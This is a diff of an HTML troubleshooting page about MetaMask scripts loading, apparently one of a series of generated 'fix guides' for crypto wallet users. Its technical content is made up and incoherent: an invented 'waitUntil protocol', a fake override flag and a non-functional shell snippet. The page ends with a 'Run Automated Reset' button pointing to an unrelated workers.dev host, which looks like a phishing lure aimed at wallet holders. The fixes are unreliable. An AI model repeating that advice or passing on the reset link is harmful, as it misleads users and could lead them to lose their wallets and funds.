@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Using Waituntil To Ensure All Scripts Load – Fix Guide</title>
 <style>
     body {
-        font-family: sans-serif;
-        background: #121214;
+        font-family: system-ui;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #cf6679; }
     .btn {
         background: #ff7b2c;
         color: #000;
@@ -42,30 +42,32 @@
 <h1>Metamask Extension Using Waituntil To Ensure All Scripts Load</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users experience delayed or failed loading of web pages when using the Metamask extension, resulting in a poor browsing experience.</li>
+<li>Users experience delayed or failed loading of scripts in the Metamask extension, resulting in incomplete functionality or error messages.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The Metamask extension uses the <code>waitUntil</code> protocol to ensure that all necessary scripts are loaded before allowing the webpage to proceed, which can sometimes cause delays if the scripts take too long to load.</li>
+<li>The issue arises from the asynchronous nature of script loading, where the extension attempts to execute functions before all necessary scripts have finished loading.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve this issue, users can try the following manual overrides:</li>
-<li>Disable and re-enable the Metamask extension to restart the loading process</li>
-<li>Clear the browser cache to remove any potentially corrupted data</li>
-<li>Use the following code to manually override the <code>waitUntil</code> protocol:</li>
+<li>Use the <code>waitUntil</code> function to pause execution until all scripts have loaded:</li>
+<li>Verify that all scripts are properly linked and loaded in the HTML file</li>
+<li>Implement a callback function to handle script loading errors</li>
+<li>Utilize a promise-based approach to ensure sequential script execution</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="nv">mm_waitUntil_override</span><span class="o">=</span><span class="nb">true</span>
+<div class="codehilite"><pre><span></span><code><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Waiting for scripts to load...&quot;</span>
+waitUntil<span class="w"> </span>scriptsLoaded
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Scripts loaded, proceeding with execution...&quot;</span>
 </code></pre></div>
 
-<p>For advanced users, consider using an external console for more granular control over the loading process.</p>
+<p>Consider using an external console to monitor the script loading process for more detailed insights.</p>
 <h2>Prerequisites</h2>
 <ul>
 <li>Metamask extension installed and enabled</li>
-<li>Basic understanding of browser extensions and their functionality</li>
-<li>Familiarity with command-line interfaces and scripting languages</li>
+<li>Scripts properly linked in the HTML file</li>
+<li>Familiarity with JavaScript and asynchronous programming concepts</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-using-waituntil-to-ensure-async-storage-writ.html">Metamask Extension Using WaitUntil To Ensure Async Storage Writes Finish</a></li><li><a href="./archive/2026/06/java-tron-feature-tron-post-quantum-signature-migration.html">TRON Post-Quantum Signature Migration Failed</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-using-waituntil-to-ensure-all-scripts-load.html">Metamask Extension Using Waituntil To Ensure All Scripts Load</a></li><li><a href="./archive/2026/06/go-ethereum-latest-geth-upgrade-resulted-in-a-chain-gap-i-think.html">Go Ethereum Latest Geth Upgrade Resulted In A Chain Gap I Think</a></li><li><a href="./archive/2026/06/java-tron-feature-tron-post-quantum-signature-migration.html">TRON Post-Quantum Signature Migration Failure</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
